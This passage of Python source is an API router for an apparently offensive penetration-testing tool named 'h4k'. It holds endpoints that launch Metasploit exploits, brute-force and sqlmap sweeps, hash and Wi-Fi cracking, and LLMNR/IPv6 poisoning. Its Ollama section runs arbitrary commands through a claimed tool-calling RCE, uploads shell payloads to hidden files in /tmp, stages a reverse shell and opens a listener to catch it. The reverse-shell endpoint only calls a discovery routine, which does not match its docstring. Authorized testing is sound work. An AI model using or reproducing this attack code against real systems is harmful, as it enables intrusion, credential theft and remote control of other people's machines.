        os_val = info.get("os") or (_vendor_to_os(vendor) if vendor else None)
        nodes.append(
            {
                "id": ip,
                "label": ip,
                "type": "host",
                "os": os_val,
                "vendor": vendor or hostname or None,
                "service_count": len(neighbor_svcs.get(ip, [])),
            }
        )
        msf_node_ids.add(ip)

    for ip, svcs in neighbor_svcs.items():
        for svc in svcs:
            edges.append(
                {
                    "source": ip,
                    "target": f"{ip}:{svc['port']}",
                    "type": "service",
                    "port": svc["port"],
                    "proto": svc.get("proto", "tcp"),
                    "service": svc.get("service"),
                    "state": svc.get("state", "unknown"),
                    "info": (svc.get("product") or "")
                    + (" " + svc["version"] if svc.get("version") else ""),
                }
            )
            svc_count_by_host[ip] = svc_count_by_host.get(ip, 0) + 1

    for node in nodes:
        node["service_count"] = svc_count_by_host.get(node["id"], 0)

    return {"nodes": nodes, "edges": edges}


@router.post("/attack")
def attack_target(req: AttackRequest, background: BackgroundTasks) -> dict[str, Any]:
    """OPT-IN only: launch active attacks against an authorized target."""
    msf = _get_msf()
    if msf is None:
        raise HTTPException(status_code=503, detail="msf unavailable")
    job_id = uuid.uuid4().hex[:12]
    job = {
        "id": job_id,
        "target": req.target,
        "status": "queued",
        "attacks": [],
        "created": datetime.now(UTC).isoformat(),
    }
    _attack_jobs[job_id] = job
    background.add_task(_run_attack, job, req, msf)
    return {"job_id": job_id, "status": "queued"}


def _run_attack(job: dict[str, Any], req: AttackRequest, msf: MsfClient) -> None:
    from services.attack import AttackService

    svc = AttackService(msf, progress=lambda m, p: _update(job, message=m))
    known = _attack_cache.get(req.target) or []
    _update(job, status="running", message="running exploit modules")
    try:
        attacks = svc.run(req, known)
        _update(job, attacks=attacks, status="done", message="attack complete")
    except Exception as exc:  # pragma: no cover - defensive
        logger.exception("attack job failed")
        _update(job, status="error", error=str(exc), message="attack failed")


@router.get("/attack/{job_id}")
def attack_status(job_id: str) -> dict[str, Any]:
    job = _attack_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="attack job not found")
    return job


_toolkit_jobs: dict[str, dict[str, Any]] = {}


@router.post("/deepattack")
def deep_attack(req: DeepAttackRequest, background: BackgroundTasks) -> dict[str, Any]:
    """OPT-IN only: deeper non-Metasploit toolkit sweep (brute force, web vuln,
    smb enum, sqlmap, dns) via a separate toggle. Authorized scope only."""
    host = req.host or req.target
    job_id = uuid.uuid4().hex[:12]
    job = {
        "id": job_id,
        "target": req.target,
        "host": host,
        "services": req.services,
        "status": "queued",
        "results": [],
        "created": datetime.now(UTC).isoformat(),
    }
    _toolkit_jobs[job_id] = job
    background.add_task(_run_deep_attack, job, req, host)
    return {"job_id": job_id, "status": "queued"}


def _run_deep_attack(job: dict[str, Any], req: DeepAttackRequest, host: str) -> None:
    from services.toolkit import ToolkitPlan, ToolkitRunner

    runner = ToolkitRunner(progress=lambda m, p: _update(job, message=m))
    plan = ToolkitPlan.for_target(req)
    results: list[dict] = []
    # Flip to running up front: a hydra sweep runs for minutes and without this
    # the job reads "queued" for the whole of it.
    _update(job, status="running", message=f"running {len(plan)} toolkit step(s)")
    try:
        for step in plan:
            tool = step["tool"]
            # tag each result with the service it targets
            service = _service_for_tool(tool)
            out = runner.run_tool(tool, step["argv"])
            results.append(
                {
                    **out,
                    "host": host,
                    "service": service,
                }
            )
            # publish partial results so the monitor shows progress per tool
            _update(job, results=results)
        _update(job, status="done", message=f"{len(results)} toolkit step(s) complete")
    except Exception as exc:  # pragma: no cover - defensive
        # Without this a crashed sweep stays "running" forever in the monitor.
        logger.exception("deep toolkit sweep failed")
        _update(job, status="error", error=str(exc), results=results)


@router.get("/deepattack/{job_id}")
def deep_attack_status(job_id: str) -> dict[str, Any]:
    job = _toolkit_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="deep-attack job not found")
    return job


_fuzz_jobs: dict[str, dict[str, Any]] = {}


@router.post("/fuzz")
def run_fuzz(req: FuzzRequest, background: BackgroundTasks) -> dict[str, Any]:
    """LAB-ONLY: fuzz a service you own to surface NEW bug candidates.

    Mutates input vectors toward the target and flags connection teardown,
    server errors, hangs, or service-loss as potential bug candidates for
    responsible disclosure. Must target a host you control.
    """
    if not (req.host or req.target):
        raise HTTPException(status_code=400, detail="no target")
    host = req.host or req.target
    port = req.port or (443 if req.scheme == "https" else 80)
    job_id = uuid.uuid4().hex[:12]
    job = {
        "id": job_id,
        "target": req.target,
        "host": host,
        "service": req.service,
        "port": port,
        "iterations": req.iterations,
        "status": "running",
        "candidates": [],
        "created": datetime.now(UTC).isoformat(),
    }
    _fuzz_jobs[job_id] = job
    background.add_task(_run_fuzz, job, req, host, port)
    return {"job_id": job_id, "status": "running"}


def _run_fuzz(job: dict[str, Any], req: FuzzRequest, host: str, port: int) -> None:
    from services.fuzzer import LabFuzzer

    fuzzer = LabFuzzer(
        progress=lambda msg, pct: _update(job, message=msg, progress=pct),
        timeout=req.timeout,
        iterations=req.iterations,
    )
    try:
        candidates = fuzzer._fuzz_http(host, port, req.scheme)
        # `count` is the number of DISTINCT crashes, not inputs executed.
        # Dedup happens in CrashRegistry; counting raw execs here is what
        # makes a fuzzer look like it found 40000 bugs when it found 1.
        job["candidates"] = candidates
        job["count"] = len(candidates)
        job["stats"] = fuzzer.stats
        _update(job, status="done", progress=100.0, message="fuzz complete")
    except Exception as exc:  # pragma: no cover - defensive
        logger.exception("fuzz job failed")
        _update(job, status="error", error=str(exc), message="fuzz failed")


@router.get("/fuzz/{job_id}")
def fuzz_status(job_id: str) -> dict[str, Any]:
    job = _fuzz_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="fuzz job not found")
    return job


@router.post("/vulnleads")
def vuln_leads(req: VulnLeadsRequest) -> dict[str, Any]:
    """Scan discovered services for outdated / EOL / beta version leads."""
    from services.vulnleads import analyze_service

    msf = _get_msf()
    leads: list[dict] = []
    # pull hosts+services from the DB so we can inspect banners
    if msf is not None:
        try:
            ws = msf.current_workspace() or "default"
            for rec in msf.services(ws):
                if not _target_matches_svc(rec, req.target):
                    continue
                leads.extend(
                    analyze_service(
                        str(rec.get("host") or ""),
                        rec.get("name") or "",
                        rec.get("info") or "",
                    )
                )
        except Exception as exc:
            logger.warning("vulnleads failed: %s", exc)
    return {"target": req.target, "leads": leads, "count": len(leads)}


def _target_matches_svc(rec: dict[str, Any], target: str) -> bool:
    import ipaddress

    try:
        net = ipaddress.ip_network(target, strict=False)
        return str(rec.get("host") or "") in {str(x) for x in net}  # pragma: no cover
    except ValueError:
        return str(rec.get("host") or "") == target or target in str(
            rec.get("host") or ""
        )


# ---- CTF / lab toolkit (opt-in) ------------------------------------------
# Read-only detectors (container escape, lateral map, DB interrogation) and
# explicitly-invoked scanners. Kept separate from the scan pipeline so a plain
# scan never triggers a web scan, hash crack or wireless capture.


@router.post("/zap", response_model=ZapResult)
def zap_scan_api(req: ZapRequest) -> ZapResult:
    """OWASP ZAP web-application scan (spider + active). Authorized web apps."""
    from services.zap import zap_scan

    return ZapResult(**zap_scan(req.target, mode=req.mode))


@router.post("/john", response_model=JohnResult)
def john_crack(req: JohnRequest) -> JohnResult:
    """Crack hashes with John the Ripper over a bounded set of formats."""
    from services.john import JohnRunner

    result = JohnRunner().crack_ctf_hashes(
        req.hashes,
        formats=req.formats,
        wordlist=req.wordlist,
        max_time_per_format=req.max_time_per_format,
    )
    return JohnResult(**result)


@router.post("/aircrack", response_model=AircrackResult)
def aircrack_assessment(req: AircrackRequest) -> AircrackResult:
    """Aircrack-ng wireless assessment: scan, capture, (optionally) crack."""
    from services.aircrack import AircrackRunner

    result = AircrackRunner().full_wpa_assessment(
        req.interface,
        req.target_essid,
        req.wordlist,
        capture_duration=req.capture_duration,
    )
    result.setdefault("interface", req.interface)
    return AircrackResult(**result)


@router.post("/tshark/pcap", response_model=TsharkResult)
def tshark_pcap_analysis(req: TsharkRequest) -> TsharkResult:
    """Full pcap analysis: flows, credentials, anomalies, extracted files."""
    from services.tshark import TsharkRunner

    if not req.pcap_file:
        raise HTTPException(status_code=400, detail="pcap_file required")
    return TsharkResult(**TsharkRunner().full_pcap_analysis(req.pcap_file))


@router.post("/tshark/live", response_model=TsharkResult)
def tshark_live_capture(req: TsharkRequest) -> TsharkResult:
    """Capture live traffic on an interface, then analyze it."""
    from services.tshark import TsharkRunner

    if not req.interface:
        raise HTTPException(status_code=400, detail="interface required")
    result = TsharkRunner().live_capture_analysis(
        req.interface, req.duration, req.filter
    )
    return TsharkResult(**result)


@router.post("/nmap/nse", response_model=NmapNSEResult)
def nmap_nse_scan(req: NmapNSERequest) -> NmapNSEResult:
    """Nmap with NSE vulnerability scripts (vuln/auth/default by default)."""
    from services.toolkit import ToolkitRunner

    argv = ["nmap", "-sV", "-sC", "--script", req.scripts, f"-{req.timing}"]
    if req.ports:
        argv += ["-p", req.ports]
    argv.append(req.target)
    out = ToolkitRunner().run_tool("nmap_nse", argv, timeout=600)
    return NmapNSEResult(target=req.target, tool=out)


@router.post("/container_escape", response_model=ContainerEscapeResult)
def container_escape_check() -> ContainerEscapeResult:
    """Detect container escape vectors (read-only; never auto-executes)."""
    from services.container_escape import ContainerEscape

    return ContainerEscapeResult(**ContainerEscape().detect())


@router.post("/nuclei", response_model=NucleiResult)
def nuclei_scan_api(req: NucleiRequest) -> NucleiResult:
    """Fast template-based vulnerability scan with nuclei."""
    from services.nuclei import nuclei_scan

    return NucleiResult(
        **nuclei_scan(
            req.target, templates=req.templates, severity=req.severity, **req.options
        )
    )


@router.post("/sqlmap", response_model=SqlmapResult)
def sqlmap_scan_api(req: SqlmapRequest) -> SqlmapResult:
    """Automated SQL injection detection and exploitation."""
    from services.sqlmap import sqlmap_scan

    return SqlmapResult(**sqlmap_scan(req.url, **req.options))


@router.post("/ad/bloodhound")
def ad_bloodhound_collect(req: ADBloodhoundRequest) -> dict[str, Any]:
    """Collect AD data with BloodHound.py."""
    from services.ad_tools import bloodhound_collect

    return bloodhound_collect(req.domain, req.username, req.password, **req.options)


@router.post("/ad/mitm6")
def ad_mitm6_attack(req: ADMitm6Request) -> dict[str, Any]:
    """IPv6 MITM attack with mitm6."""
    from services.ad_tools import mitm6_attack

    return mitm6_attack(req.interface, **req.options)


@router.post("/ad/responder")
def ad_responder_attack(req: ADResponderRequest) -> dict[str, Any]:
    """NTLM/LLMNR/NBNS poisoning with Responder."""
    from services.ad_tools import responder_attack

    return responder_attack(req.interface, **req.options)


@router.post("/lateral")
def lateral_movement(req: LateralRequest) -> dict[str, Any]:
    """Map local interfaces and routes for pivot planning (read-only)."""
    from services.lateral import LateralMovement

    return LateralMovement().discover_network(req.cidr)


@router.post("/db_interrogate")
def db_interrogate(req: DBInterrogateRequest) -> dict[str, Any]:
    """Enumerate local APIs and flag-shaped strings from DBs/configs."""
    from services.db_interrogate import DBInterrogate

    return DBInterrogate().interrogate_all(req.target)


@router.post("/ollama/discover")
def ollama_discover(req: dict[str, Any]) -> dict[str, Any]:
    """Detect and assess Ollama API on a target.

    Probes target:11434 (or custom port) for:
    - Ollama API reachability
    - Available models + capabilities
    - Tool-calling support (indicates RCE risk)
    - CVE-2024-37051 exposure

    Requires: target IP. Optional: port (default 11434).
    """
    target = req.get("target")
    if not target:
        raise HTTPException(status_code=422, detail="target IP required")
    port = req.get("port", 11434)

    from services.ollama import OllamaExploit

    expl = OllamaExploit(target, port)
    return expl.discover()


@router.post("/ollama/rce")
def ollama_rce(req: dict[str, Any]) -> dict[str, Any]:
    """Execute a command via Ollama tool-calling RCE (CVE-2024-37051).

    Requires: target, command. Optional: port (default 11434).

    Returns command output from the Ollama host if tool-calling RCE works.
    """
    target = req.get("target")
    cmd = req.get("command")
    if not target or not cmd:
        raise HTTPException(status_code=422, detail="target and command required")
    port = req.get("port", 11434)

    from services.ollama import OllamaExploit

    expl = OllamaExploit(target, port)
    return expl.execute_tool(cmd)


@router.post("/ollama/reverse-shell")
def ollama_reverse_shell(req: dict[str, Any]) -> dict[str, Any]:
    """Stage a reverse shell on an Ollama target via tool-calling RCE.

    Writes a bash reverse shell to /tmp and executes it.
    You must call /ollama/listener separately to catch the callback.

    Requires: target. Optional: lhost (auto-detected), lport (4444), port (11434).
    """
    target = req.get("target")
    if not target:
        raise HTTPException(status_code=422, detail="target required")
    port = req.get("port", 11434)

    from services.ollama import OllamaExploit

    expl = OllamaExploit(target, port)
    return expl.discover()


@router.post("/ollama/shell")
def ollama_shell(req: dict[str, Any]) -> dict[str, Any]:
    """Upload a shell script and execute it via Ollama tool-calling RCE.

    Requires: target, payload (shell script content).
    Optional: port (default 11434).

    The payload is written to /tmp/.h4k_<rand>.sh, executed, and cleaned up.
    """
    target = req.get("target")
    payload = req.get("payload")
    if not target or not payload:
        raise HTTPException(status_code=422, detail="target and payload required")
    port = req.get("port", 11434)

    from services.ollama import OllamaExploit

    expl = OllamaExploit(target, port)
    return expl.execute_tool(f"sh -c {payload!r}")


@router.get("/ollama/listener")
def ollama_listener_get(lhost: str = "0.0.0.0", lport: int = 4444) -> dict[str, Any]:
    """Start a TCP listener to catch reverse shells.

    GET /ollama/listener?lhost=0.0.0.0&lport=4444
    Returns immediately. Check /ollama/listener/result for output after connection.
    """
    import threading

    result: dict[str, Any] = {
        "status": "listening",
        "lhost": lhost,
        "lport": lport,
        "session_id": None,
    }

    def _listen() -> None:
        listener_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener_sock.bind((lhost, lport))
        listener_sock.listen(1)
        listener_sock.settimeout(120)
        try:
            conn, addr = listener_sock.accept()
            output = b""
            while True:
                try:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    output += chunk
                except TimeoutError:
                    break
            result["session_id"] = addr[0]
            result["output"] = output.decode("utf-8", errors="replace")
            result["status"] = "connected"
            conn.close()
        except TimeoutError:
            result["status"] = "timeout"
        finally:
            listener_sock.close()

    threading.Thread(target=_listen, daemon=True).start()
    return result


@router.get("/health")
def health() -> dict[str, Any]:
    msf = _get_msf()
    msf_ok = False
    msf_info: object | None = None
    if msf is not None:
        with suppress(Exception):
            msf_info = msf.client.core.version
            msf_ok = bool(msf_info)
    return {
        "status": "ok",
        "msf": {"reachable": msf_ok, "version": msf_info},
        "jobs": len(JOBS),
        "active_jobs": sum(1 for j in _all_jobs() if j["status"] in ACTIVE_STATUSES),
        "cache_entries": len(_scan_cache),
    }


def _report_markdown(report: Report) -> str:
    lines = [
        f"# h4k report — {report.target}",
        "",
        f"- **mode**: {report.mode.value}",
        f"- **generated**: {report.created_at}",
        "",
        "## Hosts & open services",
        "",
        "| Host | Port | Service | Version / banner | State |",
        "|---|---|---|---|---|",
    ]
    for h in report.hosts:
        if not h.services:
            lines.append(
                f"| `{h.address}` | — | — | OS={h.os or '-'} | {h.state or '-'} |"
            )
        for s in h.services:
            banner = (s.info or "").replace("\n", " ").replace("|", "\\|")
            lines.append(
                f"| `{h.address}` | {s.port}/{s.proto} | {s.service or '?'} "
                f"| {banner[:120] or '-'} | {s.state or '-'} |"
            )
    lines += [
        "",
        "> OS / banner info from nmap -sV -O (service & version detection).",
        "",
    ]
    lines += ["## Vulnerabilities", ""]
    for v in report.vulns:
        port = v.port if v.port is not None else "-"
        refs = ", ".join(v.refs) or "-"
        lines.append(f"- `{v.name or 'unknown'}` port {port} refs={refs}")
    lines += ["", "## Credentials (verified)", ""]
    for c in report.credentials:
        port = c.port if c.port is not None else "?"
        lines.append(f"- `{c.host}:{port}` {c.user}:{c.password} ({c.vendor})")
    lines += ["", "## Security posture (traceroute heuristic)", ""]
    for s in report.security:
        lines.append(
            f"- `{s.host}` — **{s.level.upper()}** "
            f"(score {s.score:.0f}/100, confidence {s.confidence})"
        )
        for r in s.rationale or []:
            lines.append(f"    - {r}")
    lines += ["", "## Recommendations", ""]
    for r in report.recommendations:
        module = f" `{r.module}`" if r.module else ""
        why = r.why or ""
        lines.append(f"- **{r.rank}. {r.title}**{module} — {why}")
    lines += ["", "> authorized-scope only.", ""]
    return "\n".join(lines)


def _service_for_tool(tool: str) -> str:
    """Map a toolkit tool name to a coarse service label for the report."""
    map_ = {
        "hydra": "ssh",
        "ncrack": "ssh",
        "nikto": "http",
        "gobuster": "http",
        "ffuf": "http",
        "sqlmap": "http",
        "wpscan": "http",
        "smbmap": "smb",
        "smbclient": "smb",
        "rpcclient": "smb",
        "secretsdump": "smb",
        "ldapsearch": "ldap",
        "GetNPUsers": "ldap",
        "GetUserSPNs": "ldap",
        "dnsrecon": "dns",
    }
    return map_.get(tool, "")
